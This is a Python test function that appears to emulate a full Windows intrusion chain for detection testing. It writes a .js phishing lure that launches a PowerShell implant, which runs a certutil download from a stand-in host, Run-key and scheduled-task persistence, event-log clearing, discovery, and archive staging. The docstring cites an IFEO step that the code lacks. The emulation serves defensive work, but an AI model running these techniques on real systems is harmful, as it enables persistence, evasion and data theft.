def win_full_chain(ctx):
    """A full intrusion CHAIN, not isolated techniques.

    The difference from the per-technique tests: every stage below runs from
    ONE PowerShell 'implant' process, launched through a fake phishing lure.
    That gives a real parent -> child -> grandchild lineage in Sysmon
    (shared ProcessGuid / ParentProcessGuid), which is the ONLY way the
    correlation rules can fire:

      MDF-C001  download -> execute      (certutil fetch then run)
      MDF-C004  child of a flagged parent (everything under the implant)
      cluster   convergence              (one ProcessGuid, ~5 tactics)

    Everything is benign: no network egress (certutil hits a .invalid host),
    a copy of choice.exe stands in for the payload, only a throwaway log is
    cleared, and IFEO targets notepad (restored by undo). Run on a snapshot.
    """
    root = ctx.root
    lure   = root / "Invoice_2026.pdf.js"          # double-extension lure
    payload = root / "update_svc.exe"              # benign stand-in "tool"
    staging = root / "exfil_staging"
    archive = root / "collected.zip"
    src_choice = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32" / "choice.exe"

    staging.mkdir(exist_ok=True)
    (staging / "passwords.txt").write_text(f"benign staged doc {CANARY}\n")

    # --- The implant script. One process performs the whole post-exploitation
    #     sequence, so every action shares its ProcessGuid. ---
    implant = root / "stage2.ps1"
    implant.write_text(f"""
# STAGE 3  T1105/T1218.001 -- ingress tool transfer (no egress; .invalid)
certutil.exe -urlcache -split -f http://minidfir.invalid/tool '{payload}' 2>$null
Copy-Item '{src_choice}' '{payload}' -Force        # stand-in for the 'downloaded' tool

# STAGE 3b T1204.002 -- execute what was just fetched (feeds MDF-C001)
& '{payload}' /C y /D y /T 1 2>$null

# STAGE 4  T1547.001 + T1053.005 -- persistence, two mechanisms
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v UpdateSvc /t REG_SZ /d '{payload}' /f
schtasks /create /tn UpdateSvcTask /tr '{payload}' /sc onlogon /f

# STAGE 5  T1070.001 -- defense evasion: clear a throwaway log
wevtutil cl "Key Management Service" 2>$null

# STAGE 6  T1087/T1082/T1016 -- discovery (children of the implant)
whoami /all | Out-Null
systeminfo | Out-Null
net user | Out-Null

# STAGE 7  T1074.001 + T1560.001 -- collection & staging into an archive
Compress-Archive -Path '{staging}\\*' -DestinationPath '{archive}' -Force

# STAGE 8  T1070.004 -- cleanup: delete the tool (create->execute->delete)
Remove-Item '{payload}' -Force
""", encoding="utf-8")

    # --- STAGE 1: the lure. A .js that launches the implant, the way a real
    #     phishing attachment would. This is what makes wscript -> powershell
    #     the recorded lineage instead of python -> powershell. ---
    lure.write_text(
        f'var s = new ActiveXObject("WScript.Shell");\n'
        f's.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass '
        f'-File \\"{implant}\\"", 0, true);\n', encoding="utf-8")

    # STAGE 2: "user opens the attachment" -> wscript runs the lure -> implant
    run(["wscript.exe", str(lure)])

    return {
        "marker": "UpdateSvc", "reversible": True, "detail": "full intrusion chain",
        "run_key": "UpdateSvc", "task": "UpdateSvcTask",
        "paths": [str(payload), str(archive), str(staging), str(lure), str(implant)],
    }


def win_full_chain_undo(rec):
    run(["reg", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
         "/v", rec.get("run_key", "UpdateSvc"), "/f"])
    run(["schtasks", "/delete", "/tn", rec.get("task", "UpdateSvcTask"), "/f"])
    import shutil
    for p in rec.get("paths", []):
        pp = Path(p)
        if pp.is_dir():
            shutil.rmtree(pp, ignore_errors=True)
        else:
            pp.unlink(missing_ok=True)